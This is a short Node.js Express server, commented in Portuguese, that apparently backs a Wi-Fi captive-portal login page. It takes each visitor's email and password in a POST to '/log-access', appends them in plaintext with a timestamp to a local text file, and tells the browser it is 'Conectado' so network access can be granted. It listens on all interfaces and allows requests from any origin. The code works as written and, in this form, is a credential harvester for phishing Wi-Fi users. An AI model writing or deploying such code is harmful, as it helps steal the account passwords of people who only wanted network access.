const express = require('express');
const fs = require('fs');
const app = express();
const PORT = 3000;
const LOG_FILE = 'wifi_access_log.txt'; // O arquivo de log de saída!

// 1. Configurações para receber dados e permitir acesso local
app.use(express.json()); 
app.use((req, res, next) => {
    // Permite conexões de outros dispositivos na sua rede local (LAN)
    res.header("Access-Control-Allow-Origin", "*"); 
    res.header("Access-Control-Allow-Methods", "POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
});

// 2. ROTA DE PROCESSAMENTO: Recebe o email/senha e salva
app.post('/log-access', (req, res) => {
    const { email, senha } = req.body;
    
    if (!email || !senha) {
        return res.status(400).send({ message: 'Dados incompletos.' });
    }

    const timestamp = new Date().toLocaleString('pt-BR');
    // Formato: DATA | EMAIL | SENHA
    const logEntry = `${timestamp} | ${email} | ${senha}\n`;

    // Ação principal: Escreve no arquivo TXT na sua máquina
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR LOG:', err);
            return res.status(500).send({ message: 'Erro interno do servidor.' });
        }
        
        console.log(`[LOG SUCESSO] Novo acesso de: ${email}`);
        
        // Responde ao navegador. O frontend (JS) usará isso para liberar a conexão.
        res.status(200).send({ message: 'Conectado.' });
    });
});

// 3. Inicia o servidor, escutando a rede local
app.listen(PORT, '0.0.0.0', () => { 
    console.log(`Servidor de Log Wi-Fi rodando em: http://localhost:${PORT}`);
    console.log(`Dados serão salvos em: ${LOG_FILE}`);
});